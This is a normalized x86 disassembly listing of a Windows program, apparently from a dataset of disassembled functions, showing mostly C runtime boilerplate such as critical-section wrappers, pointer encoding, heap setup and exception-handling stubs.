retn 0xc
sub_40f3c0
xor eax eax
retn
sub_40fb10
mov ecx [ eax + 0x20 ]
cmp [ ecx ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov edx [ eax + 0x30 ]
mov eax [ edx ]
cdq
retn
sub_40fb30
mov ecx [ eax + 0x24 ]
cmp [ ecx ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov edx [ eax + 0x34 ]
mov eax [ edx ]
cdq
retn
sub_4101e1
mov edx [ ebp - 0x14 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push 0x0
call sub_43c3a5
int3
sub_410b52
mov eax [ ebp - 0x14 ]
push eax
call sub_43811c
add esp 0x4
push 0x0
push 0x0
call sub_43c3a5
int3
sub_410c31
mov ecx [ ebp - 0x14 ]
push ecx
call sub_43811c
add esp 0x4
push 0x0
push 0x0
call sub_43c3a5
int3
sub_410fa0
cmp [ esi + 0x1c ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x1c ] 0x7
mov [ esi + 0x18 ] 0x0
mov [ esi + 0x8 ] cx
retn
mov eax [ esi + 0x8 ]
push eax
call sub_43811c
add esp 0x4
sub_413342
mov eax [ ebp - 0x14 ]
push eax
call sub_43811c
add esp 0x4
push 0x0
push 0x0
call sub_43c3a5
int3
sub_4135fe
mov esi [ ebp + 0x8 ]
call sub_4131b0
push 0x0
push 0x0
call sub_43c3a5
int3
sub_4175cf
mov eax [ ebp - 0x14 ]
push eax
call sub_43811c
add esp 0x4
push 0x0
push 0x0
call sub_43c3a5
int3
sub_418d20
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push eax
call sub_43811c
add esp 0x4
sub_418e80
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
and ecx 0xfffffe7f
or ecx 0x40
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_418ea0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
and ecx 0xfffffebf
or ecx 0x80
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_421610
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_421900
add esp 0x4
mov al 0x1
pop ebp
retn
sub_421630
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push 0x4
call sub_421900
add esp 0x4
mov al 0x1
pop ebp
retn
sub_421650
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push 0x0
call sub_421900
add esp 0x4
mov al 0x1
pop ebp
retn
sub_4264e0
mov eax [ ecx - 0x10 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x10 ] r--data
retn
sub_426590
push ebp
mov ebp esp
push ecx
add eax 0x18
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_40fb50
mov eax esi
mov esp ebp
pop ebp
retn
sub_4265b0
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
mov eax [ ecx - 0x8 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x8 ] r--data
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
retn
sub_427a10
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
mov esp ebp
pop ebp
retn
sub_427a30
mov al [ ecx + 0xc ]
retn
sub_427a40
mov al [ ecx + 0xd ]
retn
sub_427c60
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
mov esp ebp
pop ebp
retn
sub_427c80
mov eax [ esi + 0x8 ]
push eax
call sub_438111
mov ecx [ esi + 0x10 ]
push ecx
call sub_438111
mov edx [ esi + 0x14 ]
push edx
call sub_438111
add esp 0xc
retn
sub_428718
mov esi [ ebp + 0x8 ]
call sub_427c80
push 0x0
push 0x0
call sub_43c3a5
int3
sub_42a900
xor al al
retn
sub_42e4a0
push 0x8
call sub_42e4d0
add esp 0x4
mov al 0x1
retn
sub_42e4b0
push 0xc
call sub_42e4d0
add esp 0x4
mov al 0x1
retn
sub_42e4c0
push 0x10
call sub_42e4d0
add esp 0x4
mov al 0x1
retn
sub_42ef70
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push edx
push eax
call sub_42e960
add esp 0x8
xor eax eax
retn
jmp sub_42ef20
sub_42f460
call $+5
pop eax
lea eax [ eax + 0x1b ]
lea edx [ rw-data ]
bt [ edx ] 0x14
jae r-xdata
retn
add eax 0xc
sub_431b10
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call [ rw-data ]
add esp 0x8
retn
sub_431b30
mov eax [ esp + 0x4 ]
push eax
call [ rw-data ]
add esp 0x4
retn
sub_4320d0
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
not ecx
and [ eax + 0x14 ] ecx
retn
sub_432250
xor eax eax
xor edx edx
lea ecx [ rw-data ]
bt [ ecx ] 0x4
jae r-xdata
retn
rdtsc
sub_432370
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push ebx
nop
mov eax [ edx ]
lea ebx [ eax + ecx ]
nop
[ edx ] ebx
jne r-xdata
mov eax ebx
pop ebx
retn
sub_432660
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x4 ]
retn
sub_432cf0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x24 ]
retn
sub_432fa0
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x14 ] ecx
lea eax [ ecx + 0x1 ]
retn
sub_433460
mov eax [ esp + 0x4 ]
mov eax [ eax ]
retn
j_sub_431c30
jmp sub_431c30
sub_4334e0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x4 ]
push j_sub_431c30
push eax
call sub_4348c0
push esi
call sub_431c30
add esp 0xc
pop esi
retn
sub_433c90
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov ecx [ esp + 0x8 ]
sub eax [ ecx ]
retn
sub_433f50
mov eax [ esp + 0x4 ]
push eax
call sub_432660
imul eax eax 0xd
add esp 0x4
retn
j_sub_4325e0
jmp sub_4325e0
sub_434800
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov edx [ esp + 0x8 ]
push ecx
push edx
push eax
call sub_434750
add esp 0xc
retn
sub_434850
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov eax [ eax ]
retn
or eax 0xffffffff
retn
sub_4348b0
push 0x0
call sub_4346e0
add esp 0x4
retn
sub_435000
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
div ecx
retn
j_sub_437d2d
jmp sub_437d2d
sub_435a5c
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_437d5f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_435aa9
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_437d5f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_435af6
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_437d5f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_435b34
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_438178
sub_435bc6
mov edi edi
push esi
call sub_43c803
mov esi [ eax + 0x8 ]
call sub_43c7dd
mov edx eax
mov eax esi
pop esi
retn
sub_435c5f
mov eax [ ecx + 0x4 ]
retn
sub_435c63
mov eax [ ecx + 0x8 ]
retn
sub_435c67
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_435c7b
mov eax rw-data
retn
sub_435dd2
mov ecx [ ecx + 0x4 ]
call sub_4027f0
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_435e5e
mov eax [ rw-data ]
retn
sub_4361b0
mov eax [ ecx ]
cmp eax 0x4
jge r-xdata
retn
imul eax eax 0x18
add eax rw-data
push eax
call sub_437c0c
pop ecx
sub_4361e1
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_437bec
push [ esi ]
call sub_43811c
pop ecx
pop ecx
pop esi
retn
sub_4361f8
push [ ecx ]
call sub_437bfc
pop ecx
retn
sub_436201
push [ ecx ]
call sub_437c0c
pop ecx
retn
j_sub_43d14a
jmp sub_43d14a
sub_4363fa
push sub_4363ba
call sub_43ceb4
neg eax
sbb eax eax
pop ecx
and eax 0x18
retn
sub_4367e5
xor eax eax
inc eax
retn
sub_436858
mov eax [ ecx + 0x54 ]
test eax eax
je r-xdata
retn
push eax
call sub_43909f
pop ecx
sub_436867
mov eax [ ecx + 0x54 ]
test eax eax
je r-xdata
retn
push eax
call sub_439112
pop ecx
sub_436b3e
xor al al
retn
sub_436b41
push 0x5
pop eax
retn
sub_43749d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x24 ] ecx
pop ebp
retn
sub_4374b3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax ] sub_43749d
mov [ eax + 0xc ] ecx
pop ebp
retn
sub_43796f
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_437b16
sub_437bb1
jmp r-xdata
cmp [ rw-data ] 0xa
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax * 4 + rw-data ]
inc [ rw-data ]
push eax
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
retn
call eax
sub_437bdc
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_437bec
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_437bfc
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_437c0c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_437c2b
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_437c48
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_437c95
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_4381f8
pop ecx
sub_437d2d
mov [ ecx ] r--data
jmp sub_437c95
sub_437d84
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_437d5f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_43811c
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4381f8
sub_438127
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_43f28a
pop ecx
retn
sub_4382e6
push [ ebp + 0x8 ]
call sub_439112
pop ecx
retn
sub_4386c8
push [ ebp + 0x18 ]
call sub_439112
pop ecx
retn
sub_4386d2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_438644
add esp 0x14
pop ebp
retn
sub_4388de
push [ ebp + 0x8 ]
call sub_439112
pop ecx
retn
sub_4389e4
push [ ebp + 0x8 ]
call sub_439112
pop ecx
retn
sub_438ac7
push esi
call sub_439112
pop ecx
retn
sub_438c6d
call sub_43ffe0
mov ecx [ eax + 0x6c ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
retn
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_442197
sub_43907f
call sub_43bdf6
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_4381f8
pop ecx
retn
call sub_442a52
sub_43936e
push ebx
call sub_442eaa
pop ecx
retn
sub_439449
push 0xd
call sub_442b8f
pop ecx
retn
sub_439455
push 0xc
call sub_442b8f
pop ecx
retn
sub_43a12f
push 0xc
call sub_442b8f
pop ecx
retn
sub_43a13b
push 0xc
call sub_442b8f
pop ecx
retn
sub_43a16c
and [ esi + 0x70 ] 0xffffffef
retn
sub_43a171
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_446502
add esp 0xc
pop ebp
retn
sub_43a187
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_43a171
sub_43a7a2
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_44818e
pop ecx
pop ecx
retn
sub_43a7b6
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_43b73d
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_43f925
retn
push eax
call sub_43b718
_start
call sub_44865c
jmp sub_43a67f
sub_43ac01
mov eax sub_44925b
mov [ rw-data ] eax
mov [ rw-data ] sub_448951
mov [ rw-data ] sub_448905
mov [ rw-data ] sub_44893e
mov [ rw-data ] sub_4488a7
mov [ rw-data ] eax
mov [ rw-data ] sub_4491d3
mov [ rw-data ] sub_4488c3
mov [ rw-data ] sub_448825
mov [ rw-data ] sub_4487b1
retn
sub_43ac61
mov edi edi
push ebp
mov ebp esp
call sub_43ac01
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_4492a1
sub_43b1ec
push 0x7
call sub_442b8f
pop ecx
retn
sub_43b276
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_43a7f0
sub_43b338
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43b28c
add esp 0x14
pop ebp
retn
sub_43b456
push [ ebp + 0xc ]
call sub_439112
pop ecx
retn
sub_43b460
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_44118e
call sub_43b355
add esp 0x14
pop ebp
retn
sub_43b4aa
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_43b47f
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
int3
sub_43b4c2
push 0x8
call sub_442c68
pop ecx
retn
sub_43b4cb
push 0x8
call sub_442b8f
pop ecx
retn
sub_43b6ed
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_442b8f
pop ecx
sub_43b702
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_43b5c2
add esp 0xc
pop ebp
retn
sub_43b718
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_43b5c2
add esp 0xc
pop ebp
retn
sub_43b72e
push 0x1
push 0x0
push 0x0
call sub_43b5c2
add esp 0xc
retn
sub_43b73d
push 0x1
push 0x1
push 0x0
call sub_43b5c2
add esp 0xc
retn
sub_43b74c
mov edi edi
push ebp
mov ebp esp
call sub_43fdf7
push [ ebp + 0x8 ]
call sub_43fc48
pop ecx
push 0xff
call sub_43b718
int3
sub_43b76a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_43b7bf
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_43b933
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_442b8f
pop ecx
sub_43bc0f
push [ ebp + 0x14 ]
call sub_439112
pop ecx
retn
sub_43bd6b
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_43914e
pop ecx
pop ecx
retn
sub_43bd9a
push 0x1
call sub_442b8f
pop ecx
retn
sub_43bdec
push [ ebp + 0x8 ]
call sub_439112
pop ecx
retn
sub_43bdf6
push 0x1
call sub_43bcc9
pop ecx
retn
sub_43beb1
push [ ebp + 0x8 ]
call sub_439112
pop ecx
retn
sub_43bebb
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43bdff
add esp 0xc
pop ebp
retn
sub_43c002
push esi
call sub_439112
pop ecx
retn
sub_43c798
call sub_43ffe0
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xac ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_442197
sub_43c7c1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0xac ]
pop ebp
retn
pop ebp
jmp sub_43c798
sub_43c7dd
call sub_43ffe0
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_442197
sub_43c803
call sub_43ffe0
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_442197
sub_43c829
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_43fc48
push 0x1
push 0x0
call sub_43eff1
add esp 0xc
jmp sub_43efbe
call eax
sub_43cd6e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_43cd82
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
jmp sub_43cd6e
sub_43ceae
call sub_43b4cb
retn
sub_43ceb4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_43ce78
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_43cecb
mov [ ecx ] r--data
jmp sub_437d2d
sub_43d029
push [ ebp - 0x14 ]
call sub_43cf5c
pop ecx
retn
sub_43d06d
call sub_43ffe0
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_43ffe0
dec [ eax + 0x90 ]
sub_43d10f
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_43d118
mov esp [ ebp - 0x18 ]
call sub_44a2e2
sub_43d14a
call sub_43ffe0
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne al
retn
sub_43d1d1
push 0x4
mov eax sub_450fd6
call sub_43cd02
call sub_43ffe0
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_44a31b
call sub_44a32e
sub_43d2aa
mov eax [ ebp - 0x14 ]
call sub_43d087
retn
sub_43d521
xor eax eax
inc eax
retn
sub_43d525
mov esp [ ebp - 0x18 ]
call sub_44a2e2
sub_43d5ba
xor eax eax
inc eax
retn
sub_43d5be
mov esp [ ebp - 0x18 ]
call sub_44a2e2
sub_43dab1
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_437d5f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_43df03
call sub_43ffe0
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xc8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_442197
sub_43e385
push [ ebp + 0x8 ]
call sub_439112
pop ecx
retn
sub_43e57c
push [ ebp + 0xc ]
call sub_439112
pop ecx
retn
sub_43e7a5
push [ ebp + 0xc ]
call sub_439112
pop ecx
retn
sub_43e89b
push [ ebp + 0x8 ]
call sub_439112
pop ecx
retn
sub_43e9e7
push [ ebp + 0xc ]
call sub_439112
pop ecx
retn
sub_43eadd
push esi
call sub_439112
pop ecx
retn
sub_43ec51
push [ ebp + 0x8 ]
call sub_439112
pop ecx
retn
sub_43efa7
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43ee84
add esp 0xc
pop ebp
retn
sub_43f27a
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_43f2f1
push 0xe
call sub_442b8f
pop ecx
retn
sub_43f2fa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_43f331
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_43f732
push 0x1
call sub_442b8f
pop ecx
retn
sub_43f73b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_43f925
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_43fba6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_43fad0
add esp 0xc
pop ebp
retn 0x4
sub_43fbd9
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_44ca45
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_43fc0b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_43fad0
add esp 0xc
pop ebp
retn 0x8
sub_43fe30
push 0x0
call [ EncodePointer@IAT ]
retn
sub_43fe39
call [ TlsAlloc@IAT ]
retn 0x4
sub_43ff55
push 0xd
call sub_442b8f
pop ecx
retn
sub_43ff5e
push 0xc
call sub_442b8f
pop ecx
retn
sub_440117
push 0xd
call sub_442b8f
pop ecx
retn
sub_440123
push 0xc
call sub_442b8f
pop ecx
retn
sub_440a6e
push ebx
call sub_442eaa
pop ecx
retn
sub_440dfc
push ebx
call sub_442eaa
pop ecx
retn
sub_440f5c
push ebx
call sub_442eaa
pop ecx
retn
sub_442204
push 0xc
call sub_442b8f
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_4424ce
push 0xd
call sub_442b8f
pop ecx
retn
sub_44289d
push 0xd
call sub_442b8f
pop ecx
retn
sub_4428d6
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_44273c
pop ecx
mov [ rw-data ] 0x1
sub_442ae5
push 0x1
call sub_442b8f
pop ecx
retn
sub_442b8f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_442c5f
push 0xa
call sub_442b8f
pop ecx
retn
sub_442ea1
push 0xa
call sub_442b8f
pop ecx
retn
sub_442fa3
push 0xa
call sub_442b8f
pop ecx
retn
sub_443061
push 0xb
call sub_442b8f
pop ecx
retn
sub_444314
xor eax eax
retn
sub_446502
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_446340
add esp 0x10
pop ebp
retn
sub_446d96
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_446da6
mov edi edi
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
leave
retn
sub_446e67
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_448180
push sub_44813e
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_448905
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4488c3
add esp 0x10
pop ebp
retn
sub_44893e
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_4487b1
pop ecx
pop ecx
pop ebp
retn
sub_448951
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_448825
pop ecx
pop ecx
pop ebp
retn
sub_449510
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_449432
add esp 0x10
pop ebp
retn
sub_44a2e2
push 0x8
push r--data
call sub_43f8e0
call sub_43ffe0
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_43efbe
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_44a302
xor eax eax
inc eax
retn
sub_44a31b
call sub_43ffe0
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_44a2e2
call eax
sub_44a32e
push 0x8
push r--data
call sub_43f8e0
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
call sub_44a2e2
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_44a352
xor eax eax
inc eax
retn
sub_44a366
push sub_44a2e2
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_44a377
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_44a532
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_44a66b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_44ae65
push ebx
call sub_442eaa
pop ecx
retn
sub_44af3e
push ebx
call sub_442eaa
pop ecx
retn
sub_44b1dd
mov eax rw-data
retn
sub_44b1e3
mov eax rw-data
retn
sub_44b26f
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_44b5d7
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44b4c1
add esp 0x10
pop ebp
retn
sub_44b629
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_44b5f1
pop ecx
pop ecx
pop ebp
retn
sub_44b905
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44b7b0
add esp 0x14
pop ebp
retn
sub_44bd18
push [ ebp + 0x8 ]
call sub_439112
pop ecx
retn
sub_44be87
push [ ebp + 0x8 ]
call sub_442eaa
pop ecx
retn
sub_44bf47
and [ rw-data ] 0x0
retn
sub_44ca19
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_44c950
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_44ca64
call eax
retn
sub_44cdaa
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_44cf55
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_43a5ff
add esp 0xc
pop ebp
retn
sub_44d6bf
push 0x2
call sub_43b74c
sub_44e927
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44e723
add esp 0x10
pop ebp
retn
sub_44ea8d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44e941
add esp 0x10
pop ebp
retn
sub_450c7b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_450bcb
